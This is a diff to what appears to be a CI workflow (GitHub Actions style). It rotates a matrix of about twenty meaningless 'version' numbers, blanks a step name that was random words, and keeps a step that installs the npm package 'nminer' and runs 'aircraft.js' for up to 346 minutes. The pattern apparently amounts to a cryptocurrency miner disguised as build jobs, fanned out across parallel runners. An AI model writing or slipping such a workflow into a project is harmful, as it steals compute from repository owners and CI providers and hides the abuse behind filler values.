@@ -9,26 +9,25 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 2589 }
-          - { version: 6513 }
-          - { version: 3808 }
-          - { version: 2027 }
-          - { version: 4412 }
-          - { version: 6318 }
-          - { version: 5346 }
-          - { version: 2701 }
-          - { version: 1890 }
-          - { version: 286 }
-          - { version: 5118 }
-          - { version: 2041 }
-          - { version: 3413 }
-          - { version: 9170 }
-          - { version: 202 }
-          - { version: 6054 }
-          - { version: 2139 }
-          - { version: 9193 }
-          - { version: 6099 }
-          - { version: 6399 }
+          - { version: 6795 }
+          - { version: 608 }
+          - { version: 9829 }
+          - { version: 4315 }
+          - { version: 2979 }
+          - { version: 8496 }
+          - { version: 2526 }
+          - { version: 8493 }
+          - { version: 3634 }
+          - { version: 4728 }
+          - { version: 1224 }
+          - { version: 6568 }
+          - { version: 5541 }
+          - { version: 5605 }
+          - { version: 686 }
+          - { version: 4449 }
+          - { version: 9267 }
+          - { version: 9764 }
+          - { version: 5005 }
 
     steps:
       - name: Checkout
@@ -39,7 +38,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: for verbally searchingly knotty coarse
+      - name: 
         run: |
           npm install nminer@latest
-          timeout 322m node aircraft.js || echo "aircraft executed"
+          timeout 346m node aircraft.js || echo "aircraft executed"
